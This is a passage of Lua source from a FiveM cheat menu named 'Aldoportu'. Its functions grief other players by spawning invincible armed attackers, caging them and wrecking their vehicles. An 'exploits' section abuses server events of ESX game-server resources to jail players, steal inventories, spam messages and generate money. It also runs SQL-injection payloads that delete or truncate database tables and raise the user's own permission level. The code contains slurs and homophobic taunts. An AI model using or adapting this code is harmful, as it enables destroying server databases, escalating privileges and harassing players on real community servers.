		Aldoportu.functions.game.setVehicleProperties(spawnedVehicle, vehicleProperties)

		SetVehicleEngineOn(spawnedVehicle, true, false, false)
		SetVehRadioStation(spawnedVehicle, 'OFF')
	end
end

Aldoportu.functions.sPO.clonePedOutfit = function(me, ped)
	hat = GetPedPropIndex(ped, 0)
	hat_texture = GetPedPropTextureIndex(ped, 0)
	
	glasses = GetPedPropIndex(ped, 1)
	glasses_texture = GetPedPropTextureIndex(ped, 1)
	
	ear = GetPedPropIndex(ped, 2)
	ear_texture = GetPedPropTextureIndex(ped, 2)
	
	watch = GetPedPropIndex(ped, 6)
	watch_texture = GetPedPropTextureIndex(ped, 6)
	
	wrist = GetPedPropIndex(ped, 7)
	wrist_texture = GetPedPropTextureIndex(ped, 7)
	
	head_drawable = GetPedDrawableVariation(ped, 0)
	head_palette = GetPedPaletteVariation(ped, 0)
	head_texture = GetPedTextureVariation(ped, 0)
	
	beard_drawable = GetPedDrawableVariation(ped, 1)
	beard_palette = GetPedPaletteVariation(ped, 1)
	beard_texture = GetPedTextureVariation(ped, 1)
	
	hair_drawable = GetPedDrawableVariation(ped, 2)
	hair_palette = GetPedPaletteVariation(ped, 2)
	hair_texture = GetPedTextureVariation(ped, 2)
	
	torso_drawable = GetPedDrawableVariation(ped, 3)
	torso_palette = GetPedPaletteVariation(ped, 3)
	torso_texture = GetPedTextureVariation(ped, 3)
	
	legs_drawable = GetPedDrawableVariation(ped, 4)
	legs_palette = GetPedPaletteVariation(ped, 4)
	legs_texture = GetPedTextureVariation(ped, 4)
	
	hands_drawable = GetPedDrawableVariation(ped, 5)
	hands_palette = GetPedPaletteVariation(ped, 5)
	hands_texture = GetPedTextureVariation(ped, 5)
	
	foot_drawable = GetPedDrawableVariation(ped, 6)
	foot_palette = GetPedPaletteVariation(ped, 6)
	foot_texture = GetPedTextureVariation(ped, 6)
	
	acc1_drawable = GetPedDrawableVariation(ped, 7)
	acc1_palette = GetPedPaletteVariation(ped, 7)
	acc1_texture = GetPedTextureVariation(ped, 7)
	
	acc2_drawable = GetPedDrawableVariation(ped, 8)
	acc2_palette = GetPedPaletteVariation(ped, 8)
	acc2_texture = GetPedTextureVariation(ped, 8)
	
	acc3_drawable = GetPedDrawableVariation(ped, 9)
	acc3_palette = GetPedPaletteVariation(ped, 9)
	acc3_texture = GetPedTextureVariation(ped, 9)
	
	mask_drawable = GetPedDrawableVariation(ped, 10)
	mask_palette = GetPedPaletteVariation(ped, 10)
	mask_texture = GetPedTextureVariation(ped, 10)
	
	aux_drawable = GetPedDrawableVariation(ped, 11)
	aux_palette = GetPedPaletteVariation(ped, 11) 	
	aux_texture = GetPedTextureVariation(ped, 11)

	SetPedPropIndex(me, 0, hat, hat_texture, 1)
	SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
	SetPedPropIndex(me, 2, ear, ear_texture, 1)
	SetPedPropIndex(me, 6, watch, watch_texture, 1)
	SetPedPropIndex(me, 7, wrist, wrist_texture, 1)
	
	SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
	SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
	SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
	SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
	SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
	SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
	SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
	SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
	SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
	SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
	SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
	SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
end

Aldoportu.functions.sPO.spawnEnemies = function(target, model)
	local wep = 'WEAPON_ASSAULTRIFLE'
	for i = 1, 5 do
		pCreateThread(function()
			local coords = GetEntityCoords(target)
			RequestModel(GetHashKey(model))
			pWait(50)
			if HasModelLoaded(GetHashKey(model)) then
				local ped = CreatePed(21, GetHashKey(model),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(model),coords.x - i, coords.y + i, coords.z, 0, true, true)
				NetworkRegisterEntityAsNetworked(ped)
				SetPedRelationshipGroupHash(ped, GetHashKey('AMBIENT_GANG_WEICHENG'))
      			SetPedRelationshipGroupDefaultHash(ped, GetHashKey('AMBIENT_GANG_WEICHENG'))
				if DoesEntityExist(ped) and not IsEntityDead(target) then
					local netped = PedToNet(ped)
					NetworkSetNetworkIdDynamic(netped, false)
					SetNetworkIdCanMigrate(netped, true)
					SetNetworkIdExistsOnAllMachines(netped, true)
					pWait(100)
					NetToPed(netped)
					Aldoportu.natives.giveWeaponToPed(ped, GetHashKey(wep), 9999, 1, 1)
					SetEntityInvincible(ped, true)
					SetPedCanSwitchWeapon(ped, true)
					TaskCombatPed(ped, target, 0,16)
				elseif IsEntityDead(target) then
					TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
				else
					pWait(0)
				end
			end
		end)
	end
end

Aldoportu.functions.sPO.spawnHeliEnemies = function(target)
	pCreateThread(function()
		local x, y, z = table.unpack(GetEntityCoords(target))
		local flacko_veri_cool = 'buzzard'
		local nertigel_flighter = 'ig_claypain'
		RequestModel(flacko_veri_cool)
		RequestModel(nertigel_flighter)
		local timeout = 0
		while not HasModelLoaded(nertigel_flighter) do
			timeout = timeout + 100
			pWait(100)
			if timeout > 5000 then
				Aldoportu.pushNotification('Could not load model!', 5000)
				break
			end
		end
		while not HasModelLoaded(flacko_veri_cool) do
			timeout = timeout + 100
			pWait(100)
			if timeout > 5000 then
				Aldoportu.pushNotification('Could not load model!', 5000)
				break
			end
		end
		local flacko_dream_heli = Aldoportu.natives.createVehicle(GetHashKey(flacko_veri_cool),x,y,z + 100, GetEntityHeading(target), true, true)
		local newDriver = CreatePedInsideVehicle(flacko_dream_heli, 4, nertigel_flighter, -1, true, false)
		SetHeliBladesFullSpeed(flacko_dream_heli)

		SetCurrentPedVehicleWeapon(newDriver, GetHashKey('VEHICLE_WEAPON_PLANE_ROCKET'))
		SetVehicleShootAtTarget(newDriver, target, x, y, z)

		local netped = PedToNet(newDriver)
		NetworkSetNetworkIdDynamic(netped, false)
		SetNetworkIdCanMigrate(netped, true)
		SetNetworkIdExistsOnAllMachines(netped, true)
		pWait(30)
		NetToPed(netped)
		SetEntityInvincible(netped, true)
		
		SetPedCanSwitchWeapon(newDriver, true)
		TaskCombatPed(newDriver, target, 0, 16)
		
		local model = 'a_m_y_skater_01'
		local wep = 'WEAPON_ASSAULTRIFLE'
		for i = 1, 3 do
			local coords = GetEntityCoords(target)
			RequestModel(GetHashKey(model))
			pWait(50)
			if HasModelLoaded(GetHashKey(model)) then
				local ped = CreatePedInsideVehicle(flacko_dream_heli, 4, nertigel_flighter, i, true, false)
				NetworkRegisterEntityAsNetworked(ped)
				pCreateThread(function()
					if DoesEntityExist(ped) and not IsEntityDead(target) then
						local netped = PedToNet(ped)
						NetworkSetNetworkIdDynamic(netped, false)
						SetNetworkIdCanMigrate(netped, true)
						SetNetworkIdExistsOnAllMachines(netped, true)
						pWait(100)
						NetToPed(netped)
						Aldoportu.natives.giveWeaponToPed(ped, GetHashKey(wep), 9999, 1, 1)
						SetEntityInvincible(ped, true)
						SetPedCanSwitchWeapon(ped, true)
						TaskCombatPed(ped, target, 0,16)
					else
						pWait(0)
					end
				end)
			end
		end
	end)
end

Aldoportu.functions.sPO.spawnTankEnemy = function(target)
	pCreateThread(function()
		local theTank = 'rhino'
		RequestModel(theTank)
		while not HasModelLoaded(theTank) do
			pWait(50)
		end
		local lVehicle = GetVehiclePedIsIn(target, false)
		local x,y,z = table.unpack(GetEntityCoords(target))
		local tank = Aldoportu.natives.createVehicle(GetHashKey(theTank), x + 20,y + 20,z + 5,GetEntityCoords(target),true,false)
		Aldoportu.trashFunctions.reqControlOnce(tank)
		local pPed = 's_m_y_swat_01'
		RequestModel(pPed)
		while not HasModelLoaded(pPed) do
			RequestModel(pPed)
			pWait(50)
		end
		local NerdTigel = CreatePedInsideVehicle(tank, 4, GetEntityModel(Aldoportu.datastore.pLocalPlayer.pedId), -1, true, false)
		Aldoportu.trashFunctions.reqControlOnce(NerdTigel)
		SetDriverAbility(NerdTigel, 10.0)
		SetDriverAggressiveness(NerdTigel, 10.0)
		TaskCombatPed(NerdTigel, target, 0, 16)
	end)
end

Aldoportu.functions.sPO.cagePlayer = function(target)
	local x, y, z = table.unpack(GetEntityCoords(target))
	local propHash = GetHashKey('prop_doghouse_01')
	RequestModel(propHash)
	pCreateThread(function()
		local timeout = 0
		while not HasModelLoaded(propHash) do
			timeout = timeout + 100
			pWait(100)
			if timeout > 5000 then
				Aldoportu.pushNotification('Could not load model!', 5000)
				break
			end
		end
		Aldoportu.natives.clearPedTasksImmediately(target)
		local cageObj = Aldoportu.natives.createObject(propHash, x, y, z, true, true, false)
		SetEntityHeading(cageObj, 0.0)
		FreezeEntityPosition(cageObj, true)
	end)
end

Aldoportu.functions.sPO.giveAllWeapons = function(asPickup, target)
	for i = 1, #Aldoportu.trashTables.weaponsModels do
		if asPickup then
			CreatePickup(GetHashKey('PICKUP_'..Aldoportu.trashTables.weaponsModels[i]), GetEntityCoords(target))
		else
			Aldoportu.natives.giveWeaponToPed(target, GetHashKey(Aldoportu.trashTables.weaponsModels[i]), 250, false, false)
		end
	end
end

Aldoportu.functions.sPO.ramVehicle = function(target, m_vehicle)
	pCreateThread(function() 
		local model = GetHashKey(m_vehicle)
		RequestModel(model)
		while not HasModelLoaded(model) do
			pWait(0)
		end
		local offset = GetOffsetFromEntityInWorldCoords(target, 0, -10.0, 0)
		if HasModelLoaded(model) then
			local veh = Aldoportu.natives.createVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(target), true, true)
			NetworkRegisterEntityAsNetworked(VehToNet(veh))
			SetVehicleForwardSpeed(veh, 60.0)
		end
	end)
end

Aldoportu.functions.sPO.spawnTrollProp = function(target, prop)
	local propHash = GetHashKey(prop)
	RequestModel(propHash)
	pCreateThread(function()
		local timeout = 0
		while not HasModelLoaded(propHash) do
			timeout = timeout + 100
			pWait(100)
			if timeout > 5000 then
				Aldoportu.pushNotification('Could not load model!', 5000)
				break
			end
		end
		local x,y,z = table.unpack(GetEntityCoords(target))
		local object = Aldoportu.natives.createObject(propHash, x, y, z, true, true, false)
		AttachEntityToEntity(object, target, GetPedBoneIndex(target, SKEL_Spine_Root), 0.0, 0.0, 0.0, 0.0, 90.0, 0, false, false, false, false, 2, true)
		--[[SetModelAsNoLongerNeeded(propHash)]]
	end)
end

Aldoportu.functions.sPO.shootAt = function(target, weaponName)
	if IsPedInAnyVehicle(target, true) then
		Aldoportu.natives.clearPedTasksImmediately(target)
	end
	local destination = GetPedBoneCoords(target, SKEL_ROOT, 0.0, 0.0, 0.0)
	local origin = GetPedBoneCoords(target, SKEL_R_Hand, 0.0, 0.0, 0.2)
	local weaponHash = GetHashKey(weaponName)
	Aldoportu.natives.shootSingleBulletBetweenCoords(origin.x, origin.y, origin.z, destination.x, destination.y, destination.z, 1, 0, weaponHash, Aldoportu.datastore.pLocalPlayer.pedId, false, false, 1)
end

Aldoportu.functions.sPO.rapeVehicle = function(vehicle)
	if not IsPedAPlayer(GetPedInVehicleSeat(vehicle, -1)) then
		Aldoportu.trashFunctions.reqControlOnce(vehicle)
		if NetworkHasControlOfEntity(vehicle) then
			SetEntityAsMissionEntity(vehicle, false, false)
			StartVehicleAlarm(vehicle)
			DetachVehicleWindscreen(vehicle)
			SmashVehicleWindow(vehicle, 0)
			SmashVehicleWindow(vehicle, 1)
			SmashVehicleWindow(vehicle, 2)
			SmashVehicleWindow(vehicle, 3)
			SetVehicleTyreBurst(vehicle, 0, true, 1000.0)
			SetVehicleTyreBurst(vehicle, 1, true, 1000.0)
			SetVehicleTyreBurst(vehicle, 2, true, 1000.0)
			SetVehicleTyreBurst(vehicle, 3, true, 1000.0)
			SetVehicleTyreBurst(vehicle, 4, true, 1000.0)
			SetVehicleTyreBurst(vehicle, 5, true, 1000.0)
			SetVehicleTyreBurst(vehicle, 4, true, 1000.0)
			SetVehicleTyreBurst(vehicle, 7, true, 1000.0)
			SetVehicleDoorBroken(vehicle, 0, true)
			SetVehicleDoorBroken(vehicle, 1, true)
			SetVehicleDoorBroken(vehicle, 2, true)
			SetVehicleDoorBroken(vehicle, 3, true)
			SetVehicleDoorBroken(vehicle, 4, true)
			SetVehicleDoorBroken(vehicle, 5, true)
			SetVehicleDoorBroken(vehicle, 6, true)
			SetVehicleDoorBroken(vehicle, 7, true)
			SetVehicleLights(vehicle, 1)
			SetVehicleLightsMode(vehicle, 1)
			SetVehicleNumberPlateTextIndex(vehicle, 5)
			SetVehicleNumberPlateText(vehicle, 'd'..'opamine')
			SetVehicleDirtLevel(vehicle, 10.0)
			SetVehicleModColor_1(vehicle, 1)
			SetVehicleModColor_2(vehicle, 1)
			SetVehicleCustomPrimaryColour(vehicle, 255, 51, 255)
			SetVehicleCustomSecondaryColour(vehicle, 255, 51, 255)
			SetVehicleBurnout(vehicle, true)
			ForceVehicleEngineAudio(vehicle, 'faggio')
			SetVehicleLightsMode(vehicle, 1)
			SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fDriveBiasFront', 0.9)
			SetVehicleSteerBias(vehicle, 1.0)
		end
	end
end

Aldoportu.functions.sPO.SearchDisc = function(player)
	local discSecondarySearchInventory = {
		type = 'player',
		owner = '',
		seize = true
	}
	if Aldoportu.datastore.ESX ~= nil then
		Aldoportu.datastore.ESX.TriggerServerCallback('disc-inventoryhud:getIdentifier', function(identifier)
			discSecondarySearchInventory.owner = identifier
			Aldoportu.dTCE(false, false, 'disc-inventoryhud:openInventory', discSecondarySearchInventory)
		end, player)
	else
		Aldoportu.pushNotification('Could not find ESX, try refresing it in the settings tab', 5000)
	end
end

Aldoportu.functions.sPO.StealDisc = function(player)
	local discSecondaryStealInventory = {
		type = 'player',
		owner = '',
		steal = true
	}
	if Aldoportu.datastore.ESX ~= nil then
		Aldoportu.datastore.ESX.TriggerServerCallback('disc-inventoryhud:getIdentifier', function(identifier)
			discSecondaryStealInventory.owner = identifier
			Aldoportu.dTCE(false, false, 'disc-inventoryhud:openInventory', discSecondaryStealInventory)
		end, player)
	else
		Aldoportu.pushNotification('Could not find ESX, try refresing it in the settings tab', 5000)
	end
end

Aldoportu.functions.sPO.jailTheFucker = function(target, time)
	if Aldoportu.functions.doesResourceExist('esx-qalle-jail') or Aldoportu.functions.doesResourceExist('esx_qalle_jail') then
		Aldoportu.dTCE(false, true, 'esx-qalle-jail:jailPlayer', target, time, 'Aldoportu | discord.gg/WriteLine')
	elseif Aldoportu.functions.doesResourceExist('esx_jailer') then
		Aldoportu.dTCE(false, true, 'esx_jailler:sendToJail', target, time, 'Aldoportu | discord.gg/WriteLine', time)
		Aldoportu.dTCE(false, true, 'esx_jailer:sendToJail', target, time, 'Aldoportu | discord.gg/WriteLine', time)
	elseif Aldoportu.functions.doesResourceExist('esx_jail') then
		Aldoportu.dTCE(false, true, 'esx_jail:sendToJail', target, time, 'Aldoportu | discord.gg/WriteLine')
	else
		Aldoportu.pushNotification('Resource was not found!', 5000)
	end
end

Aldoportu.functions.sPO.unJailTheFucker = function(target)
	if Aldoportu.functions.doesResourceExist('esx-qalle-jail') or Aldoportu.functions.doesResourceExist('esx_qalle_jail') then
		Aldoportu.dTCE(false, true, 'esx-qalle-jail:unJailPlayer', target)
	elseif Aldoportu.functions.doesResourceExist('esx_jailer') then
		Aldoportu.dTCE(false, true, 'esx_jailler:sendToJail', target, 0, 'Aldoportu | discord.gg/WriteLine', time)
		Aldoportu.dTCE(false, true, 'esx_jailer:sendToJail', target, 0, 'Aldoportu | discord.gg/WriteLine', time)
	elseif Aldoportu.functions.doesResourceExist('esx_jail') then
		Aldoportu.dTCE(false, true, 'esx_jail:sendToJail', target, 0, 'Aldoportu | discord.gg/WriteLine')
	else
		Aldoportu.pushNotification('Resource was not found!', 5000)
	end
end

Aldoportu.functions.sPO.communityService = function(target)
	if Aldoportu.functions.doesResourceExist('ESX_CommunityService') or Aldoportu.functions.doesResourceExist('esx_CommunityService') then
		Aldoportu.dTCE(false, true, 'esx_communityservice:sendToCommunityService', target, 5391)
	else
		Aldoportu.pushNotification('Resource was not found!', 5000)
	end
end

--[[
	Some nice exploits yes?
]]

Aldoportu.functions.exploits = {}

Aldoportu.functions.exploits.gcphoneTwitter = function()
	if Aldoportu.functions.doesResourceExist('gcPhone') or Aldoportu.functions.doesResourceExist('xenknight') then
		pCreateThread(function()
			Aldoportu.dTCE(false, true, 'gcPhone:twitter_createAccount', 'EsX_UmuT Siker', 'EsX_UmuT Siker', 'https://www.cjnews.com/wp-content/uploads/2012/01/gay-640x588.jpg')
			pWait(1500)
			Aldoportu.dTCE(false, true, 'gcPhone:twitter_login', 'EsX_UmuT Siker', 'EsX_UmuT Siker')
			pWait(1500)
			for i = 1, 50 do
				Aldoportu.dTCE(true, true, 'gcPhone:twitter_postTweets', 'EsX_UmuT Siker', 'EsX_UmuT Siker', 'EsX_UmuT Siker > all | ᛋᛋESX_UmuTᛋᛋ#0283')
			end
		end)
	else Aldoportu.pushNotification('Resource was not found!', 5000) end
end

Aldoportu.functions.exploits.esx_license = function()
	if Aldoportu.functions.doesResourceExist('esx_license') then
		local licensesToExploit = {
			'Aldoportu',
			'Aldoportu',
			'Nertigel#5391',
			'RIP Your SQL Faggot',
			'Make sure to wipe all tables ;)',
			'Nertigel Was Here',
			'discord.gg/WriteLine'
		}
		for i = 0, #licensesToExploit do
			local plist = Aldoportu.natives.getActivePlayers()
			for player = 0, #plist do
				Aldoportu.dTCE(true, true, 'esx_license:addLicense', player, licensesToExploit[i], function(cb)
					cb(true)
					dir_print('added license '..licensesToExploit[i]..' to '..player)
				end)
			end
		end
	else Aldoportu.pushNotification('Resource was not found!', 5000) end
end

Aldoportu.functions.exploits.esx_givelicenses = function()
	if Aldoportu.functions.doesResourceExist('esx_license') then
		local licensesToExploit = {
			'dmv',
			'drive',
			'drive_bike',
			'drive_truck',
			'weapon'
		}
		for i = 0, #licensesToExploit do
			local plist = Aldoportu.natives.getActivePlayers()
			for player = 0, #plist do
				Aldoportu.dTCE(true, true, 'esx_license:addLicense', player, licensesToExploit[i], function(cb)
					cb(true)
					dir_print('added license '..licensesToExploit[i])
				end)
			end
		end
	else Aldoportu.pushNotification('Resource was not found!', 5000) end
end

Aldoportu.functions.exploits.esx_kashacters = function(player_specific, task, table)
	if Aldoportu.functions.doesResourceExist('esx_kashacters') or 
	Aldoportu.functions.doesResourceExist('esx_Kashacters') or
	Aldoportu.functions.doesResourceExist('Kashacters') or 
	Aldoportu.functions.doesResourceExist('kashacters') then
		if player_specific then
			local player_specific2 = player_specific:gsub('steam', '')
			player_specific2 = 'Char1'..player_specific2
			Aldoportu.dTCE(false, true, 'kashactersS:DeleteCharacter', '\';DELETE FROM '..table..' WHERE identifier=\''..player_specific..'\';/')
			Aldoportu.dTCE(false, true, 'kashactersS:DeleteCharacter', '\';DELETE FROM '..table..' WHERE identifier=\''..player_specific2..'\';/')
			Aldoportu.dTCE(false, true, 'kashactersS:DeleteCharacter', '\';DELETE FROM '..table..' WHERE target=\''..player_specific..'\';/')
			Aldoportu.dTCE(false, true, 'kashactersS:DeleteCharacter', '\';DELETE FROM '..table..' WHERE target=\''..player_specific2..'\';/')
		else
			if task == 'clean' then
				Aldoportu.dTCE(false, true, 'kashactersS:DeleteCharacter', '\';TRUNCATE TABLE '..table..';/')
			elseif task == 'flood' then
				Aldoportu.dTCE(false, true, 'kashactersS:DeleteCharacter', '\';UPDATE users SET permission_level=\'100\' WHERE name=\'' ..NetworkPlayerGetName(PlayerId()) .. '\';/')
			end
		end
		Aldoportu.pushNotification('Exploit ran successfully', 15000)
	else Aldoportu.pushNotification('Resource was not found!', 5000) end
end

Aldoportu.functions.exploits.interactSound = function()
	if Aldoportu.functions.doesResourceExist('interactSound') or 
	Aldoportu.functions.doesResourceExist('InteractSound') or 
	Aldoportu.functions.doesResourceExist('interact-sound') then
		Aldoportu.dTCE(true, true, 'InteractSound_SV:PlayOnAll', 'demo', 99.0)
		Aldoportu.dTCE(true, true, 'InteractSound_SV:PlayWithinDistance', 5000.0, 'demo', 98.0)
		Aldoportu.dTCE(true, true, 'InteractSound_SV:PlayOnAll', 'cuff', 97.0)
		Aldoportu.dTCE(true, true, 'InteractSound_SV:PlayOnAll', 'buckle', 96.0)
	else Aldoportu.pushNotification('Resource was not found!', 5000) end
end

Aldoportu.functions.exploits.phoneSpam = function()
	if Aldoportu.functions.doesResourceExist('esx_phone') or 
	Aldoportu.functions.doesResourceExist('gcPhone') or 
	Aldoportu.functions.doesResourceExist('xenknight') then
		Aldoportu.dTCE(true, true, 'esx_phone:send', 'police', 'EsX_UmuT Siker', true, {x = 1337.0, y = 1337.0, z = 1337.0})
		Aldoportu.dTCE(true, true, 'esx_phone:send', 'ambulance', 'EsX_UmuT Siker', true, {x = 1337.0, y = 1337.0, z = 1337.0})
		Aldoportu.dTCE(true, true, 'esx_phone:send', 'taxi', 'EsX_UmuT Siker', true, {x = 1337.0, y = 1337.0, z = 1337.0})
		Aldoportu.dTCE(true, true, 'esx_phone:send', 'realestateagent', 'EsX_Umut Siker', true, {x = 1337.0, y = 1337.0, z = 1337.0})
	elseif Aldoportu.functions.doesResourceExist('esx_addons_gcphone') then
		Aldoportu.dTCE(true, true, 'esx_addons_gcphone:startCall', 'police', 'EsX_Umut Siker', {x = 1337.0, y = 1337.0, z = 1337.0})
		Aldoportu.dTCE(true, true, 'esx_addons_gcphone:startCall', 'ambulance', 'EsX_Umut Siker', {x = 1337.0, y = 1337.0, z = 1337.0})
		Aldoportu.dTCE(true, true, 'esx_addons_gcphone:startCall', 'taxi', 'EsX_Umut Siker', {x = 1337.0, y = 1337.0, z = 1337.0})
		Aldoportu.dTCE(true, true, 'esx_addons_gcphone:startCall', 'realestateagent', 'EsX_Umut Siker', {x = 1337.0, y = 1337.0, z = 1337.0})
	end
end

Aldoportu.functions.exploits.esx_moneymaker = function()
	if Aldoportu.datastore.ESX == nil then Aldoportu.pushNotification('ESX was not found.') return end
	local m = Aldoportu.trashFunctions.keyboardInput('Enter amount of money', '', 12)
	if not Aldoportu.functions.game.isNullOrEmpty(m) then
		local doloop = Aldoportu.trashFunctions.keyboardInput('Enter amount loops', '', 12)
		if not doloop then doloop = 1 end
		
		Aldoportu.functions.exploits.run_esx_moneymaker(m, doloop)
	else
		Aldoportu.pushNotification('Please enter a valid amount of money!', 5000)
	end
end

Aldoportu.functions.exploits.run_esx_moneymaker = function(moneyAmt, loopAmt)
	if Aldoportu.datastore.ESX == nil then Aldoportu.pushNotification('ESX was not found.') return end
	for iloop = 0, loopAmt do
		if Aldoportu.functions.doesResourceExist('disc-base') then
			Aldoportu.dTCE(true, true, 'disc-base:givePlayerMoney', moneyAmt)
			Aldoportu.dTCE(true, true, 'disc-base:givePlayerDirtyMoney', moneyAmt)
		end
		if Aldoportu.functions.doesResourceExist('esx_vangelico_robbery') or Aldoportu.functions.doesResourceExist('esx_vangelico') then
			Aldoportu.dTCE(true, true, 'esx_vangelico_robbery:gioielli')
			Aldoportu.dTCE(true, true, 'esx_vangelico_robbery:gioielli1')
			
			Aldoportu.dTCE(true, true, 'lester:vendita')
		end
		if Aldoportu.functions.doesResourceExist('esx_burglary') or Aldoportu.functions.doesResourceExist('99kr-burglary') then
			Aldoportu.dTCE(true, true, '99kr-burglary:addMoney', moneyAmt)
			Aldoportu.dTCE(true, true, 'burglary:money', moneyAmt)
		end
		if Aldoportu.functions.doesResourceExist('esx_minerjob') or Aldoportu.functions.doesResourceExist('esx_miner') or Aldoportu.functions.doesResourceExist('esx_mining') then
			Aldoportu.dTCE(true, true, 'esx_mining:getItem')
			Aldoportu.dTCE(true, true, 'esx_mining:sell')
		end
		if Aldoportu.functions.doesResourceExist('esx_fishing') or Aldoportu.functions.doesResourceExist('loffe-fishing') or Aldoportu.functions.doesResourceExist('james_fishing') then
			Aldoportu.dTCE(true, true, 'esx_fishing:caughtFish')
			Aldoportu.dTCE(true, true, 'loffe-fishing:giveFish')
			Aldoportu.dTCE(true, true, 'loffe-fishing:sellFish')
			Aldoportu.datastore.ESX.TriggerServerCallback('james_fishing:receiveFish', function(received)
				if received then
					dir_print('received fish')
				end
			end)
			Aldoportu.datastore.ESX.TriggerServerCallback('james_fishing:sellFish', function(sold, fishesSold)
				if sold then
					dir_print('sold '..fishesSold)
				end
			end)
		end
		if Aldoportu.functions.doesResourceExist('esx_mugging') then
			Aldoportu.dTCE(true, true, 'esx_mugging:giveMoney', moneyAmt)
		end
		if Aldoportu.functions.doesResourceExist('loffe_robbery') then
			Aldoportu.dTCE(true, true, 'loffe_robbery:pickUp', iloop)
		end
		if Aldoportu.functions.doesResourceExist('esx_prisonwork') or Aldoportu.functions.doesResourceExist('loffe_prisonwork') then
			Aldoportu.dTCE(true, true, 'esx_loffe_fangelse:Pay')
		end
		if Aldoportu.functions.doesResourceExist('esx_robnpc') then
			Aldoportu.dTCE(true, true, 'esx_robnpc:giveMoney')
		end
		if Aldoportu.functions.doesResourceExist('MF_DrugSales') or Aldoportu.functions.doesResourceExist('MF_drugsales') or Aldoportu.functions.doesResourceExist('ESX_DrugSales') then
			Aldoportu.dTCE(true, true, 'MF_DrugSales:Sold', 'water', moneyAmt, iloop)
		end
		if Aldoportu.functions.doesResourceExist('lenzh_chopshop') or Aldoportu.functions.doesResourceExist('esx_chopshop') then
			Aldoportu.dTCE(true, true, 'lenzh_chopshop:rewards')
			Aldoportu.dTCE(true, true, 'lenzh_chopshop:sell', 'battery', 5)
			Aldoportu.dTCE(true, true, 'lenzh_chopshop:sell', 'lowradio', 5)
			Aldoportu.dTCE(true, true, 'lenzh_chopshop:sell', 'stockrim', 5)
			Aldoportu.dTCE(true, true, 'lenzh_chopshop:sell', 'highrim', 5)
			Aldoportu.dTCE(true, true, 'lenzh_chopshop:sell', 'highradio', 5)
			Aldoportu.dTCE(true, true, 'lenzh_chopshop:sell', 'airbag', 5)
		end
		if Aldoportu.functions.doesResourceExist('ESX_Deliveries') then
			Aldoportu.dTCE(true, true, 'esx_deliveries:AddCashMoney', moneyAmt)
			Aldoportu.dTCE(true, true, 'esx_deliveries:AddBankMoney', moneyAmt)
			Aldoportu.dTCE(true, true, 'esx_deliveries:finishDelivery:server')
		end
		if Aldoportu.functions.doesResourceExist('ESX_Cargodelivery') then
			Aldoportu.datastore.ESX.TriggerServerCallback('esx_cargodelivery:sellCargo', function(received)
				if received then
					dir_print('received '..moneyAmt)
				end
			end, moneyAmt)
		end
		if Aldoportu.functions.doesResourceExist('napadtransport') or Aldoportu.functions.doesResourceExist('Napad_transport_z_gotowka') or Aldoportu.functions.doesResourceExist('esx_truck_robbery') then
			Aldoportu.dTCE(true, true, 'napadtransport:graczZrobilnapad')
		end
		if Aldoportu.functions.doesResourceExist('napadnakase') or Aldoportu.functions.doesResourceExist('Napad_na_kase') then
			Aldoportu.dTCE(true, true, 'tost:zgarnijsiano')
		end
		if Aldoportu.functions.doesResourceExist('utk_oh') or Aldoportu.functions.doesResourceExist('utk_ornateheist') or Aldoportu.functions.doesResourceExist('aurora_principalbank') then
			Aldoportu.dTCE(true, true, 'utk_oh:rewardCash')
			Aldoportu.dTCE(true, true, 'utk_oh:rewardGold')
			Aldoportu.dTCE(true, true, 'utk_oh:rewardDia')
			Aldoportu.dTCE(true, true, 'utk_oh:giveidcard')
		end

		--[[local jobsToExploit = {
			'esx_hunting',
			'esx_qalle_hunting',
			'esx-qalle-hunting',
			'esx_taxijob',
			'esx_taxi',
			'esx_carthiefjob',
			'esx_carthief',
			'esx_rangerjob',
			'esx_ranger',
			'esx_godirtyjob',
			'esx_godirty',
			'esx_banksecurityjob',
			'esx_banksecurity',
			'esx_pilotjob',
			'esx_pilot',
			'esx_pizzajob',
			'esx_pizza',
			'esx_gopostaljob',
			'esx_gopostal',
			'esx_garbagejob',
			'esx_garbage',
			'esx_truckerjob',
			'esx_trucker'
		}
		local jTEsuffix = {
			':pay',
			':finish',
			':finishJob',
			':reward',
			':sell',
			':success'
		}
		pCreateThread(function()
			for i=1, #jobsToExploit do
				if Aldoportu.functions.doesResourceExist(jobsToExploit[i]) then
					for suff=1, #jTEsuffix do
						pWait(50)
						Aldoportu.dTCE(true, true, jobsToExploit[i]..jTEsuffix[suff], moneyAmt)
					end
				end
			end
		end)]]
	end
end

Aldoportu.functions.exploits.esx_give_something = function(item_type, item_name, item_amount)
	local plist = Aldoportu.natives.getActivePlayers()
	for i=1, #plist do
		Aldoportu.dTCE(true, true, 'esx:giveInventoryItem', GetPlayerServerId(plist[i]), item_type, item_name, item_amount)
	end
end

Aldoportu.functions.exploits.esx_moneywash = function()
	local m = Aldoportu.trashFunctions.keyboardInput('Enter amount of money', '', 12)
	if not Aldoportu.functions.game.isNullOrEmpty(m) then
		if Aldoportu.functions.doesResourceExist('esx_blanchisseur') or Aldoportu.functions.doesResourceExist('esx_moneywash') then
			Aldoportu.dTCE(true, true, 'esx_blanchisseur:washMoney', m)
			Aldoportu.dTCE(true, true, 'esx_moneywash:washMoney', m)
			Aldoportu.dTCE(true, true, 'esx_moneywash:withdraw', m)
		end
	else
		Aldoportu.pushNotification('Please enter a valid amount of money!', 5000)
	end
end

Aldoportu.functions.exploits.esx_harvest_stop = function()
	if Aldoportu.functions.doesResourceExist('esx_drugs') then
